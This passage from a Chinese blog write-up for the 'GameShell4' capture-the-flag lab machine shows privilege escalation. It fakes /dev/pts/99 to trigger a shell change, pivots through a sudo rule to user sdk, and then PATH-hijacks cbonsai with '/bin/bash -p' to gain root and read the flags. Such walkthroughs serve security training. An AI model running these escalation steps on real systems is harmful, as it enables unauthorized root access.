+<p>主要功能是：检测是否存在 <code>/dev/pts/99</code>，如果存在，则修改 <code>/etc/passwd</code>，将用户 <code>sdk</code> 的 shell 从 <code>/usr/games/cbonsai</code> 改为 <code>/bin/bash</code>，从而获得交互式 shell</p>
+<p>伪造一个<code>/dev/pts/99</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">xcm@GameShell4:/tmp$ <span class="hljs-built_in">mkdir</span> -p /tmp/holdptys<br>xcm@GameShell4:/tmp$ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 110); <span class="hljs-keyword">do</span> python3 -c <span class="hljs-string">&#x27;import os,pty,time; m,s=pty.openpty(); print(os.ttyname(s)); time.sleep(600)&#x27;</span>&gt;/tmp/holdptys/<span class="hljs-variable">$i</span>.out 2&gt;/tmp/holdptys/<span class="hljs-variable">$i</span>.err &amp; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>成功进行修改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">xcm@GameShell4:/$ /opt/revive <br>[+] /dev/pts/99 found! Updating sdk shell...<br>[+] Success! sdk shell updated to /bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">xcm@GameShell4:/$ <span class="hljs-built_in">sudo</span> -u sdk  /usr/local/bin/uv <span class="hljs-built_in">help</span> <span class="hljs-built_in">help</span><br>sdk@GameShell4:/$ <span class="hljs-built_in">id</span><br>uid=1002(sdk) gid=1002(sdk) <span class="hljs-built_in">groups</span>=1002(sdk)<br></code></pre></td></tr></table></figure>
+
+<h2 id="3、获取root权限"><a href="#3、获取root权限" class="headerlink" title="3、获取root权限"></a>3、获取root权限</h2><p>查看sudo -l</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sdk@GameShell4:/$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> sdk on GameShell4:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/usr/games<br><br>User sdk may run the following commands on GameShell4:<br>    (ALL) NOPASSWD: /usr/local/bin/livescreen<br></code></pre></td></tr></table></figure>
+
+<p>查看文件<code>livescreen</code>内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sdk@GameShell4:/$ strings /usr/local/bin/livescreen<br><span class="hljs-comment">#!/bin/bash</span><br>cbonsai -i -l<br></code></pre></td></tr></table></figure>
+
+<p>查看<code>cbonsai</code>的路径和PATH环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sdk@GameShell4:/$ <span class="hljs-built_in">which</span> cbonsai<br>/usr/games/cbonsai<br><br>sdk@GameShell4:/$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/games<br></code></pre></td></tr></table></figure>
+
+<p>同时发现<code>/usr/local/bin</code>可写</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sdk@GameShell4:/$ <span class="hljs-built_in">ls</span> -ld /usr/local/bin<br>drwxrwxr-x+ 2 root root 4096 Dec  2 08:29 /usr/local/bin<br></code></pre></td></tr></table></figure>
+
+<p>直接PATH劫持</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sdk@GameShell4:/$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -p&#x27;</span> &gt; /usr/local/bin/cbonsai<br>sdk@GameShell4:/$ <span class="hljs-built_in">chmod</span> +x /usr/local/bin/cbonsai<br></code></pre></td></tr></table></figure>
+
+<p>成功获取到root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sdk@GameShell4:/$ <span class="hljs-built_in">sudo</span> /usr/local/bin/livescreen<br>root@GameShell4:/# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<h1 id="七、查看FLAG"><a href="#七、查看FLAG" class="headerlink" title="七、查看FLAG"></a>七、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@GameShell4:/# <span class="hljs-built_in">cat</span> /root/root.txt /home/xcm/user.txt <br>flag&#123;root-983b0f2b5412aadd94ed08f249355686&#125;<br>flag&#123;user-602d9cd809f3b29eae8bc042bdf6c1ca&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/TCP79-Finger/" class="print-no-link">#TCP79_Finger</a>
+      
+        <a href="/tags/HTTP%E8%AE%A4%E8%AF%81/" class="print-no-link">#HTTP认证</a>
+      
+        <a href="/tags/Sudo-uv/" class="print-no-link">#Sudo_uv</a>
+      
+        <a href="/tags/PATH%E5%8A%AB%E6%8C%81/" class="print-no-link">#PATH劫持</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mazesec_Gameshell4</div>
+      <div>http://miao-sec.github.io/Maze-sec/Mazesec-Gameshell4/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/vulnyx/Vlx-Lower4/" title="Vlx_Lower4">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Vlx_Lower4</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Vulnyx/Vlx-Lower3/" title="Vlx_Lower3">
+                        <span class="hidden-mobile">Vlx_Lower3</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
